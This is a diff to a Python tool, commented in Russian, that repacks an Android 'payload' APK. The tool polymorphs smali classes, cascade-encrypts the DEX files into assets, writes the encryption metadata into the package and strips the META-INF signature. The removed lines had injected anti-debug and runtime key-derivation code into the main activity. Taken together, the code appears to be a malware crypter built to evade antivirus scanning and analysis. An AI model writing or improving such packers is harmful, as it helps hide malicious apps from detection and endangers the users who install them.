@@ -238,38 +238,35 @@ invoke-static {v0}, Ljava/lang/System;->exit(I)V
         # 1. Полиморфизм
         self.polymorph_smali_classes(payload_dir)
         
-        # 2. Каскадное шифрование DEX
+        # 2. Шифруем DEX → кладём зашифрованные копии в assets/
+        #    Оригинальные DEX файлы НЕ удаляем — APK должен оставаться установимым
+        assets_dir = payload_dir / "assets"
+        assets_dir.mkdir(exist_ok=True)
         key_meta_all = {}
-        for dex in payload_dir.glob("classes*.dex"):
+        for dex in list(payload_dir.glob("classes*.dex")):
             data = dex.read_bytes()
             enc_data, meta = self.cascade_encrypt(data)
-            dex.unlink()
-            dex.with_suffix(".dex.enc").write_bytes(enc_data)
+            enc_name = dex.stem + ".dex.enc"
+            (assets_dir / enc_name).write_bytes(enc_data)
             key_meta_all[dex.name] = meta
-            logger.info(f"Encrypted {dex.name}: {len(data)} → {len(enc_data)} bytes")
-        
-        # 3. Вставка anti-debug в главный Smali
-        main_smali = next(payload_dir.rglob("*MainActivity*.smali"), None) or next(payload_dir.rglob("*.smali"), None)
-        if main_smali:
-            content = main_smali.read_text("utf-8", errors="ignore")
-            content = content.replace(
-                ".method protected onCreate(Landroid/os/Bundle;)V",
-                self.generate_runtime_key_stub() + "\n" + self.inject_anti_debug() + "\n.method protected onCreate(Landroid/os/Bundle;)V"
-            )
-            main_smali.write_text(content)
-            logger.info("Injected anti-debug and runtime key derivation")
-        
-        # 4. Пересобираем APK
+            logger.info(f"Encrypted {dex.name}: {len(data)} → {len(enc_data)} bytes (original DEX kept)")
+
+        # 3. Пересобираем APK
+        #    META-INF удаляем — подпись всё равно невалидна после перепаковки,
+        #    Android установит APK если включено "Неизвестные источники"
         output_name = f"{Path(payload_apk_path).stem}_packed_{datetime.now():%Y%m%d_%H%M%S}.apk"
         final_apk = self.output_dir / output_name
-        
+
         with zipfile.ZipFile(final_apk, 'w', zipfile.ZIP_DEFLATED) as z_out:
             for p in payload_dir.rglob('*'):
                 if p.is_file():
                     arc = str(p.relative_to(payload_dir))
+                    # Убираем META-INF (невалидная подпись хуже чем отсутствующая)
+                    if arc.startswith("META-INF"):
+                        continue
                     z_out.write(p, arc)
-            
-            # Сохраняем метаданные шифрования
+
+            # Метаданные шифрования
             z_out.writestr("assets/.meta_enc", base64.b64encode(repr(key_meta_all).encode()))
         
         # Очистка
